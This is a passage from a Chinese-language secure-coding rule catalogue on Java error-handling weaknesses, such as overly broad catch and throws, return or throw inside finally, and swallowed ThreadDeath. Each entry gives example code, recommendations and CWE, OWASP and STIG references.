<h5 id="EXPLANATION-245"><a href="#EXPLANATION-245" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>多个 catch 块看上去既难看又繁琐，但使用一个“简约”的 catch 块捕获高级别的异常类（如 Exception），可能会混淆那些需要特殊处理的异常，或是捕获了不应在程序中这一点捕获的异常。本质上，捕获范围过大的异常与“Java 分类定义异常”这一目的是相违背的。随着程序的增加而抛出新异常时，这种做法会十分危险。而新发生的异常类型也不会被注意到。</p>
<p>示例：以下代码使用了同一方式来处理三种不同的异常类型。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">  doExchange();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">  logger.error(&quot;doExchange failed&quot;, e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch (InvocationTargetException e) &#123;</span><br><span class="line"></span><br><span class="line">  logger.error(&quot;doExchange failed&quot;, e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch (SQLException e) &#123;</span><br><span class="line"></span><br><span class="line">  logger.error(&quot;doExchange failed&quot;, e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实，与其这样，还不如使用一个单独的 catch 块来处理这三种异常，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">  doExchange();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">  logger.error(&quot;doExchange failed&quot;, e);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是如果修改 doExchange()，以抛出需要以某种不同的方式处理的新异常类型，则范围过大的 catch 块会阻止编译器指出这一情况（有新的异常抛出）。此外，新 catch 块也将处理那些来自于 RuntimeException 的异常，比如 ClassCastException 和 NullPointerException，而这些异常的发生是不在程序员的计划之内的。</p>
<h5 id="RECOMMENDATIONS-244"><a href="#RECOMMENDATIONS-244" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要捕获范围过大的异常类，比如 Exception、Throwable、Error 或 <runtimeexception>，除非是级别非常高的程序或线程。</runtimeexception></p>
<h5 id="REFERENCES-243"><a href="#REFERENCES-243" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ERR07-J. Do not throw RuntimeException, Exception, or Throwable CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 396</p>
<p>[3] Standards Mapping - FIPS200 AU</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h4 id="Poor-Error-Handling-Overly-Broad-Throws"><a href="#Poor-Error-Handling-Overly-Broad-Throws" class="headerlink" title="Poor Error Handling: Overly Broad Throws"></a>Poor Error Handling: Overly Broad Throws</h4><h5 id="ABSTRACT-245"><a href="#ABSTRACT-245" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该方法抛出了一个过于笼统异常，从而使调用者很难处理和修复发生的错误。</p>
<h5 id="EXPLANATION-246"><a href="#EXPLANATION-246" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>声明一种可以抛出 Exception 或 Throwable 异常的方法，从而使调用者很难处理和修复发生的错误。Java 异常机制的设置是：调用者可以方便地预计有可能发生的各种错误，并为每种异常情况编写处理代码。同时声明：一个方法抛出一个过于笼统的异常违反该系统。</p>
<p>示例：以下方法抛出了三种类型的异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public void doExchange()</span><br><span class="line"></span><br><span class="line">  throws IOException, InvocationTargetException,</span><br><span class="line"></span><br><span class="line">         SQLException &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样写看上去会显得更加紧凑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void doExchange()</span><br><span class="line"></span><br><span class="line">  throws Exception &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样做会防碍调用者理解和处理所发生的异常。此外，如果 doExchange() 因为变更了代码，而引入了一个需要不同于之前异常处理方式的新型异常，则不能使用简单的方式来处理该要求。</p>
<h5 id="RECOMMENDATIONS-245"><a href="#RECOMMENDATIONS-245" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>不要声明抛出 Exception 或 Throwable 异常的方法。如果方法抛出的异常无法恢复，或者通常不能被调用者捕获，那么可以考虑抛出未检查的异常，而不是已检查的异常。这可以通过实现一个继承自 RuntimeException 或Error 的类来代替 Exception，或者还可以在方法中加入 try/catch 块将已检查的异常转换为未检查异常。</p>
<h5 id="REFERENCES-244"><a href="#REFERENCES-244" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ERR07-J. Do not throw RuntimeException, Exception, or Throwable CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 397</p>
<p>[3] Standards Mapping - FIPS200 AU</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h4 id="Poor-Error-Handling-Program-Catches-NullPointerException"><a href="#Poor-Error-Handling-Program-Catches-NullPointerException" class="headerlink" title="Poor Error Handling: Program Catches NullPointerException"></a>Poor Error Handling: Program Catches NullPointerException</h4><h5 id="ABSTRACT-246"><a href="#ABSTRACT-246" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>通常来说，捕获 NullPointerException 并不是一个好方法。</p>
<h5 id="EXPLANATION-247"><a href="#EXPLANATION-247" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>程序员通常会在以下三种情况中捕获 NullPointerException：</p>
<ol>
<li><p>程序间接引用一个空指针。捕获发生的异常要比修复一个潜在的问题更为简单。</p>
</li>
<li><p>程序显式地抛出了一个 NullPointerException 异常来标记错误状况。</p>
</li>
<li><p>该代码是测试代码的一部分，为正在测试的类提供了一个异常输入。</p>
</li>
</ol>
<p>在上述三种情况中，只有最后一种是可以接受的。</p>
<p>示例：下列代码错误地捕获了一个 NullPointerException 异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line"></span><br><span class="line">  mysteryMethod();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch (NullPointerException npe) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-246"><a href="#RECOMMENDATIONS-246" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>程序不应该间接引用空指针。如果您无法排除间接引用空指针的可能性，则必须仔细地检查代码，以确保对异常的处理方式不会导致程序进入一个异常或不合法的状态。</p>
<p>如果显式地抛出 NullPointerException，那么您应该修改程序，使其抛出一个 RuntimeException 或 Error 异常来取代它。</p>
<h5 id="REFERENCES-245"><a href="#REFERENCES-245" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ERR08-J. Do not catch NullPointerException or any of its ancestors CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 395</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[5] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h4 id="Poor-Error-Handling-Return-Inside-Finally"><a href="#Poor-Error-Handling-Return-Inside-Finally" class="headerlink" title="Poor Error Handling: Return Inside Finally"></a>Poor Error Handling: Return Inside Finally</h4><h5 id="ABSTRACT-247"><a href="#ABSTRACT-247" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>从 finally 块中返回会导致异常的丢失。</p>
<h5 id="EXPLANATION-248"><a href="#EXPLANATION-248" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>finally 块中的返回指令会导致从 try 块中抛出的异常丢失。</p>
<p>例 1：在下列代码中，第二次调用 doMagic 方法，同时将参数 true 传递给该方法会导致抛出 MagicException 异常，该异常将不会传递给调用者。finally 块中的返回指令会导致异常的丢弃。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">public class MagicTrick &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public static class MagicException extends Exception &#123; &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;Watch as this magical code makes an &quot; +</span><br><span class="line"></span><br><span class="line">                     &quot;exception disappear before your very eyes!&quot;);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;First, the kind of exception handling &quot; +</span><br><span class="line"></span><br><span class="line">                     &quot;you&apos;re used to:&quot;);</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line"></span><br><span class="line">    doMagic(false);</span><br><span class="line"></span><br><span class="line">  &#125; catch (MagicException e) &#123;</span><br><span class="line"></span><br><span class="line">    // An exception will be caught here</span><br><span class="line"></span><br><span class="line">    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;Now, the magic:&quot;);</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line"></span><br><span class="line">    doMagic(true);</span><br><span class="line"></span><br><span class="line">  &#125; catch (MagicException e) &#123;</span><br><span class="line"></span><br><span class="line">    // No exception caught here, the finally block ate it</span><br><span class="line"></span><br><span class="line">    e.printStackTrace();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  System.out.println(&quot;tada!&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">public static void doMagic(boolean returnFromFinally)</span><br><span class="line"></span><br><span class="line">throws MagicException &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line"></span><br><span class="line">    throw new MagicException();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  finally &#123;</span><br><span class="line"></span><br><span class="line">    if (returnFromFinally) &#123;</span><br><span class="line"></span><br><span class="line">      return;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-247"><a href="#RECOMMENDATIONS-247" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>将返回指令移到 finally 块之外。如果必须要 finally 块返回一个值，可以简单地将该返回值赋给一个本地变量，然后在 finally 块执行完毕后返回该变量。</p>
<h5 id="REFERENCES-246"><a href="#REFERENCES-246" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] ERR04-J. Do not complete abruptly from a finally block CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 584</p>
<p>[3] Standards Mapping - FIPS200 AU</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A7 Improper Error Handling</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.7</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.2, Requirement 6.5.6</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3120 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3120 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3120 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3120 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3120 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3120 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3120 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h4 id="Poor-Error-Handling-Swallowed-ThreadDeath"><a href="#Poor-Error-Handling-Swallowed-ThreadDeath" class="headerlink" title="Poor Error Handling: Swallowed ThreadDeath"></a>Poor Error Handling: Swallowed ThreadDeath</h4><h5 id="ABSTRACT-248"><a href="#ABSTRACT-248" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>如果重新抛出了 ThreadDeath 错误，则出现问题的线程可能实际上并未终止。</p>
<h5 id="EXPLANATION-249"><a href="#EXPLANATION-249" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果异步终止了应用程序后需要将其清除，则应仅捕获 ThreadDeath 错误。如果捕获了 ThreadDeath 错误，则将其重新抛出非常重要，因为这样该线程才真正地终止。抛出 ThreadDeath 的目的是终止线程。如果 ThreadDeath 被抑制，则它可以阻止线程停止并导致意外行为，因为代码最初抛出 ThreadDeath 的目的是希望停止该线程。</p>
<p>例 1：下列代码捕获了 ThreadDeath 但未将其重新抛出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">try</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//some code</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch(ThreadDeath td)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//clean up code</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-248"><a href="#RECOMMENDATIONS-248" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>始终重新抛出 ThreadDeath。 例 2：下列代码捕获了 ThreadDeath 并在清除后将其重新抛出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">try</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//some code</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">catch(ThreadDeath td)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">//clean up code</span><br><span class="line"></span><br><span class="line">throw td;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-247"><a href="#REFERENCES-247" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Sun Tutorial</p>
<p>[2] Scott Oaks, Henry Wong Java Threads O’Reilly</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 691</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<h4 id="Poor-Error-Handling-Throw-Inside-Finally"><a href="#Poor-Error-Handling-Throw-Inside-Finally" class="headerlink" title="Poor Error Handling: Throw Inside Finally"></a>Poor Error Handling: Throw Inside Finally</h4><h5 id="ABSTRACT-249"><a href="#ABSTRACT-249" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用 finally 块中的 throw 语句会通过 try-catch-finally 破坏逻辑进度。</p>
<h5 id="EXPLANATION-250"><a href="#EXPLANATION-250" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 Java 中，finally 块通常在其相应的 try-catch 块之后执行，该块通常用于自由分配的资源，例如文件句柄或数据库指针。由于破坏了正常的程序执行，在 finally 块中抛出异常会绕过关键的清除代码。</p>
<p>例 1：在下列代码中，抛出 FileNotFoundException 时，将绕过对 stmt.close() 的调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">public void processTransaction(Connection conn) throws FileNotFoundException</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    FileInputStream fis = null;</span><br><span class="line"></span><br><span class="line">    Statement stmt = null;</span><br><span class="line"></span><br><span class="line">    try</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">        fis = new FileInputStream(&quot;badFile.txt&quot;);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    catch (FileNotFoundException fe)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        log(&quot;File not found.&quot;);</span><br><span 